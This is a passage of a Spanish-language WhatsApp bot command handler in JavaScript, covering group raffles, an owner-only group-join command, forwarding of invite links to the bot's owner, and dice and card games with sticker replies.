║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ ${xxx[0]} : ${yxx[0]} : ${zxx[0]}
╿║ ➪ ${xxx[1]} : ${yxx[1]} : ${zxx[1]}
╿║ ➪ ${xxx[2]} : ${yxx[2]} : ${zxx[2]}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ ${endx}`
enviar(slorx)
break
 case "sorteo":
            if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if(!isGroup) return enviar(respuesta.grupos)
if(!q) return enviar(`⛔️ Ejemplo : .sorteo 50 Coins`)
try{
d = []
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks = `
╭━⊷ 𝗙𝗘𝗟𝗜𝗖𝗜𝗗𝗔𝗗𝗘𝗦
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙋𝙍𝙀𝙈𝙄𝙊 : ${q}
╿║ ➪ 𝗚𝗔𝗡𝗔𝗗𝗢𝗥 : @${groupMembers[r].id.split('@')[0]}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝗙𝗘𝗟𝗜𝗖𝗜𝗗𝗔𝗗𝗘𝗦
`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar(respuesta.error)
}
break
case 'sorteonumeros': case "sortearnumeros": case "sorteo-numeros":
           if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if(!isGroup) return enviar(respuesta.grupos)
if(!q) return enviar(`⛔️ Ejemplo : .sorteonumeros 1`)
try{
var numerossrt = sortear[Math.floor(Math.random() * sortear.length)] 
d = []
for(i = 0; i < 1; i++) {
teks = `
╭━⊷ 𝗙𝗘𝗟𝗜𝗖𝗜𝗗𝗔𝗗𝗘𝗦
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝙍𝙀𝙎𝙐𝙇𝙏𝘼𝘿𝙊𝙎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙋𝙍𝙀𝙈𝙄𝙊 : ${q}
╿║ ➪ 𝗚𝗔𝗡𝗔𝗗𝗢𝗥 : ${numerossrt}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝗙𝗘𝗟𝗜𝗖𝗜𝗗𝗔𝗗𝗘𝗦
`
d.push(numerossrt)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar(respuesta.error)
}
break
case 'join': case 'entrar':
if(!isOwner) return enviar('[❌️] Compre la versión Premiun')
if (!q) return enviar('[❌️] Coloque un link')
if (!isUrl(args[0]) || !args[0].includes('whatsapp.com')) return enviar("[❌️] Link inválido")
try {
let result = args[0].split('chat.whatsapp.com/')[1]
await sock.groupAcceptInvite(result)
enviar('[✅️] Vale, hice lo que me pediste.')
} catch(erro) {
if(String(erro).includes("resource-limit")) {
enviar("[❌️] El bot no puede unirse a este grupo porque está lleno")
} else if(String(erro).includes("not-authorized")) {
enviar("[❌️] El bot no puede unirse a este grupo porque ha sido eliminado.")
} else if(String(erro).includes("gone")){
enviar("[❌️] El bot no puede unirse a este grupo porque el enlace se ha restablecido")
} else if(String(erro).includes("not-acceptable")) {
enviar("[❌️] Él grupo no existe")
} else {
enviar("[❌️] No puedo entrar")
}
}
break
case 'convite':
if(!budy.includes("chat.whatsapp.com")) return enviar("[❌️] Envie el link de su grupo")
cnvt = args.join(" ")
enviar(`[✅️] Él link ya fue enviado a mi creador , el elijira si unirse o no`)
const kvikk = `
╭━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝗜𝗡𝗩𝗜𝗧𝗔𝗖𝗜𝗢𝗡⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝙐𝙎𝙐𝘼𝙍𝙄𝙊 : ${sender.split("@")[0]}
╿║ ➪ 𝙍𝙀𝙁𝙍𝘼𝙉 : ${cnvt}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷𝐆𝐔𝐄𝐃𝐄𝐋 𝐈𝐍𝐍𝐎𝐕𝐀𝐓𝐈𝐎𝐍
`
sock.sendMessage(`${numerodono}@s.whatsapp.net`,{ text : kvikk},{quoted : info})
break
case 'dadonegro': 
sock.sendMessage(from,{ text :  '🎲𝙻𝙰𝙽𝚉𝙰𝙽𝙳𝙾 𝙳𝙰𝙳𝙾🎲, 𝚂𝙸 𝚃𝙴 𝚂𝙰𝙻𝙴 𝙴𝙻 𝙽𝚄𝙼𝙴𝚁𝙾 𝟷 𝙲𝙾𝙻𝙾𝚁 𝙽𝙴𝙶𝚁𝙾 𝙶𝙰𝙽𝙰𝚂\n𝚂𝚄𝙴𝚁𝚃𝙴!!'  } , { quoted : info})
const dadino = ["1", "2","3","4","5","6"]
const dadin2 = dadino[Math.floor(Math.random() * dadino.length)]
gg = dadin2
const finDado = fs.readFileSync('./archivos/juegos/'+dadin2+'.webp')
if ( dadin2 == "1"){
setTimeout(async() => {
const finDa = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐃𝐀𝐃𝐎 𝐍𝐄𝐆𝐑𝐎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${dadin2}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  finDa  } , { quoted : info})
}, 5000)
}
else { 
setTimeout(async() => {
const finN = `
╭━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐃𝐀𝐃𝐎 𝐍𝐄𝐆𝐑𝐎⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${dadin2}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  finN  } , { quoted : info})
}, 5000)
}
setTimeout(async() => {
sock.sendMessage(from,{ sticker:  finDado}, {quoted: info})
}, 3000)
break
case 'dadoespecial': 
sock.sendMessage(from,{ text :  '🎲𝙻𝙰𝙽𝚉𝙰𝙽𝙳𝙾 𝙳𝙰𝙳𝙾🎲, 𝚂𝙸 𝚃𝙴 𝚂𝙰𝙻𝙴 𝙴𝙻 𝙽𝚄𝙼𝙴𝚁𝙾 7 𝙶𝙰𝙽𝙰𝚂\n𝚂𝚄𝙴𝚁𝚃𝙴!!'  } , { quoted : info})
const dadinoz = ["2","3","4","5","6","7"]
const dadinz2 = dadinoz[Math.floor(Math.random() * dadinoz.length)]
gg = dadinz2
const finDadoz = fs.readFileSync('./archivos/juegos/'+dadinz2+'.webp')
if ( dadinz2 == "7"){
setTimeout(async() => {
const finDaz = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐃𝐀𝐃𝐎 𝐄𝐒𝐏𝐄𝐂𝐈𝐀𝐋⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${dadinz2}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  finDaz  } , { quoted : info})
}, 5000)
}
else { 
setTimeout(async() => {
const finNz = `
╭━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐃𝐀𝐃𝐎 𝐄𝐒𝐏𝐄𝐂𝐈𝐀𝐋⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${dadinz2}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  finNz  } , { quoted : info})
}, 5000)
}
setTimeout(async() => {
sock.sendMessage(from,{ sticker:  finDadoz}, {quoted: info})
}, 3000)
break
case 'cartadoble': case "cartaigual":
sock.senMessage(from,{ text : '[🃏] 𝙻𝙰𝙽𝚉𝙰𝙽𝙳𝙾 𝙲𝙰𝚁𝚃𝙰𝚂 !! 𝚂𝙸 𝚂𝙰𝙲𝙰𝚂 𝙸𝙶𝚄𝙰𝙻 𝙰𝙻 𝙱𝙾𝚃, 𝙶𝙰𝙽𝙰𝚂!![🃏]'},{ quoted : info})
const cartaAletatoria = ["uno", "dos","tres","cuatro","cinco","seis","siete","ocho","nueve","diez","once","doce","trece"]
finCar = cartaAletatoria[Math.floor(Math.random() * cartaAletatoria.length)]
finCar1 = cartaAletatoria[Math.floor(Math.random() * cartaAletatoria.length)]
ggoi = finCar
labza = fs.readFileSync('./archivos/juegos/'+finCar+'.webp')
labza1 = fs.readFileSync('./archivos/juegos/'+finCar1+'.webp')
if (( finCar == "uno" && finCar1 == "uno") || ( finCar == "dos" && finCar1 == "dos") || ( finCar == "tres" && finCar1 == "tres") || ( finCar == "cuatro" && finCar1 == "cuatro") || ( finCar == "cinco" && finCar1 == "cinco") || ( finCar == "seis" && finCar1 == "seis") || ( finCar == "siete" && finCar1 == "siete") || ( finCar == "ocho" && finCar1 == "ocho") || ( finCar == "nueve" && finCar1 == "nueve") || ( finCar == "diez" && finCar1 == "diez") || ( finCar == "once" && finCar1 == "once") || ( finCar == "doce" && finCar1 == "doce") || ( finCar == "trece" && finCar1 == "trece") ){
setTimeout(async() => {
const respT = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐃𝐎𝐁𝐋𝐄⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finCar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT  } , { quoted : info})
}, 7000)
}
else { 
setTimeout(async() => {
const respT2 = `
╭━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐃𝐎𝐁𝐋𝐄⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finCar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT2  } , { quoted : info})
gettCoins(sender,1)
}, 7000)
}
setTimeout(async() => {
enviar("[🕹] *Jugada del Bot*")
sock.sendMessage(from,{ sticker:  labza}, {quoted: info})
}, 3000)
setTimeout(async() => {
enviar(`[🕹] *Jugada de ${pushname}*`)
sock.sendMessage(from,{ sticker:  labza1}, {quoted: info})
}, 5000)
break


case 'cartamayor': case "cartamayoria":
sock.sendMessage(from,{ text : '[🃏]𝙻𝙰𝙽𝚉𝙰𝙽𝙳𝙾 𝙲𝙰𝚁𝚃𝙰𝚂 !! 𝚂𝙸 𝚂𝙰𝙲𝙰𝚂 𝙼𝙰𝚈𝙾𝚁 𝙰𝙻 𝙱𝙾𝚃, 𝙶𝙰𝙽𝙰𝚂!![🃏]'}, { quoted : info})
const cartaMayor = ["uno", "dos","tres","cuatro","cinco","seis","siete","ocho","nueve","diez","once","doce","trece"]
finMar = cartaMayor[Math.floor(Math.random() * cartaMayor.length)]
finMar1 = cartaMayor[Math.floor(Math.random() * cartaMayor.length)]
lfin = fs.readFileSync('./archivos/juegos/'+finMar+'.webp')
lfin1 = fs.readFileSync('./archivos/juegos/'+finMar1+'.webp')
if ((finMar == "uno" && finMar1 == "dos") || (finMar == "uno" && finMar1 == "tres") || (finMar == "uno" && finMar1 == "cuatro") || (finMar == "uno" && finMar1 == "cinco") || (finMar == "uno" && finMar1 == "seis") || (finMar == "uno" && finMar1 == "siete") || (finMar == "uno" && finMar1 == "ocho") || (finMar == "uno" && finMar1 == "nueve") || (finMar == "uno" && finMar1 == "diez") || (finMar == "uno" && finMar1 == "once")|| (finMar == "uno" && finMar1 == "doce") || (finMar == "uno" && finMar1 == "trece")){
 setTimeout(async() => {
const respT20 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT20  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "dos" && finMar1 == "tres") || (finMar == "dos" && finMar1 == "cuatro") || (finMar == "dos" && finMar1 == "cinco") || (finMar == "dos" && finMar1 == "seis") || (finMar == "dos" && finMar1 == "siete") || (finMar == "dos" && finMar1 == "ocho") || (finMar == "dos" && finMar1 == "nueve") || (finMar == "dos" && finMar1 == "diez") || (finMar == "dos" && finMar1 == "once")|| (finMar == "dos" && finMar1 == "doce") || (finMar == "dos" && finMar1 == "trece")){
 setTimeout(async() => {
const respT21 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT21  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "tres" && finMar1 == "cuatro") || (finMar == "tres" && finMar1 == "cinco") || (finMar == "tres" && finMar1 == "seis") || (finMar == "tres" && finMar1 == "siete") || (finMar == "tres" && finMar1 == "ocho") || (finMar == "tres" && finMar1 == "nueve") || (finMar == "tres" && finMar1 == "diez") || (finMar == "tres" && finMar1 == "once")|| (finMar == "tres" && finMar1 == "doce") || (finMar == "tres" && finMar1 == "trece")){
 setTimeout(async() => {
const respT22 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT22  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "cuatro" && finMar1 == "cinco") || (finMar == "cuatro" && finMar1 == "seis") || (finMar == "cuatro" && finMar1 == "siete") || (finMar == "cuatro" && finMar1 == "ocho") || (finMar == "cuatro" && finMar1 == "nueve") || (finMar == "cuatro" && finMar1 == "diez") || (finMar == "cuatro" && finMar1 == "once")|| (finMar == "cuatro" && finMar1 == "doce") || (finMar == "cuatro" && finMar1 == "trece")){
 setTimeout(async() => {
const respT23 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT23  } , { quoted : info})
}, 7000) 
 }else if ((finMar == "cinco" && finMar1 == "seis") || (finMar == "cinco" && finMar1 == "siete") || (finMar == "cinco" && finMar1 == "ocho") || (finMar == "cinco" && finMar1 == "nueve") || (finMar == "cinco" && finMar1 == "diez") || (finMar == "cinco" && finMar1 == "once")|| (finMar == "cinco" && finMar1 == "doce") || (finMar == "cinco" && finMar1 == "trece")){
 setTimeout(async() => {
const respT24 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT24  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "seis" && finMar1 == "siete") || (finMar == "seis" && finMar1 == "ocho") || (finMar == "seis" && finMar1 == "nueve") || (finMar == "seis" && finMar1 == "diez") || (finMar == "seis" && finMar1 == "once")|| (finMar == "seis" && finMar1 == "doce") || (finMar == "seis" && finMar1 == "trece")){
 setTimeout(async() => {
const respT25 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT25  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "siete" && finMar1 == "ocho") || (finMar == "siete" && finMar1 == "nueve") || (finMar == "siete" && finMar1 == "diez") || (finMar == "siete" && finMar1 == "once")|| (finMar == "siete" && finMar1 == "doce") || (finMar == "siete" && finMar1 == "trece")){
 setTimeout(async() => {
const respT26 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT26  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "ocho" && finMar1 == "nueve") || (finMar == "ocho" && finMar1 == "diez") || (finMar == "ocho" && finMar1 == "once")|| (finMar == "ocho" && finMar1 == "doce") || (finMar == "ocho" && finMar1 == "trece")){
 setTimeout(async() => {
const respT27 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT27  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "nueve" && finMar1 == "diez") || (finMar == "nueve" && finMar1 == "once")|| (finMar == "nueve" && finMar1 == "doce") || (finMar == "nueve" && finMar1 == "trece")){
 setTimeout(async() => {
const respT28 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT28  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "diez" && finMar1 == "once")|| (finMar == "diez" && finMar1 == "doce") || (finMar == "diez" && finMar1 == "trece")){
 setTimeout(async() => {
const respT29 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT29  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "once" && finMar1 == "doce") || (finMar == "once" && finMar1 == "trece")){
 setTimeout(async() => {
const respT30 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT30  } , { quoted : info})
}, 7000) 
 } else if ((finMar == "doce" && finMar1 == "trece")){
 setTimeout(async() => {
const respT31 = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT31  } , { quoted : info})
}, 7000) 
 }else {
setTimeout(async() => {
const respT32 = `
╭━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 𝐌𝐀𝐘𝐎𝐑⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
`
sock.sendMessage(from,{ text :  respT32  } , { quoted : info})
}, 7000) 
 } 
setTimeout(async() => {
enviar("[🕹] *Jugada del Bot*")
sock.sendMessage(from,{ sticker:  lfin}, {quoted: info})
}, 3000)
setTimeout(async() => {
enviar(`[🕹] *Jugada de ${pushname}*`)
sock.sendMessage(from,{ sticker:  lfin1}, {quoted: info})
}, 5000) 
break
case 'haz': case "cartauno":
sock.sendMessage(from,{ text : '[🃏]𝙻𝙰𝙽𝚉𝙰𝙽𝙳𝙾 𝙲𝙰𝚁𝚃𝙰 !![🃏]\n\nSaca 1 para ganar'}, { quoted : info})
const cartaMayorx = ["uno", "dos","tres","cuatro","cinco","seis","siete","ocho","nueve","diez","once","doce","trece"]
finMarx = cartaMayorx[Math.floor(Math.random() * cartaMayorx.length)]
finMar1x = cartaMayorx[Math.floor(Math.random() * cartaMayorx.length)]
lfin = fs.readFileSync('./archivos/juegos/'+finMarx+'.webp')

if ((finMarx == "uno" && finMar1x == "uno")){
const respT20x = `
╭━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 ⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMar1x}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐆𝐀𝐍𝐀𝐒𝐓𝐄
`
setTimeout(async() => {
sock.sendMessage(from,{ text :  respT20x  } , { quoted : info})
}, 5000) 
setTimeout(async() => {
sock.sendMessage(from,{ sticker:  lfin}, {quoted: info})
}, 2000)
 }else {
const respT20xx = `
╭━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
║                   
╿╭═──-─═─ • ◆ • ─═─═─═
║║      ⃝⃕𝐂𝐀𝐑𝐓𝐀 ⃝⃕
╿╞═─-──-─ • ◆ • ─═─═─═
╿║ ➪ 𝚄𝚂𝚄𝙰𝚁𝙸𝙾 : ${pushname}
╿║ ➪ 𝙻𝙰𝙽𝚉𝙰𝙼𝙸𝙴𝙽𝚃𝙾 : ${finMarx}
╿╰─═─-─── • ◆ • ─═─═
║
╰━⊷ 𝐏𝐄𝐑𝐃𝐈𝐒𝐓𝐄
`
setTimeout(async() => {
sock.sendMessage(from,{ text :  respT20xx  } , { quoted : info})
}, 5000) 
setTimeout(async() => {
sock.sendMessage(from,{ sticker:  lfin}, {quoted: info})
}, 2000) 
 }
break
case 'carasello1': case "caraosello1": case "carasello":
const cara = fs.readFileSync('./archivos/juegos/cara.webp');
const sello = fs.readFileSync('./archivos/juegos/sello.webp');
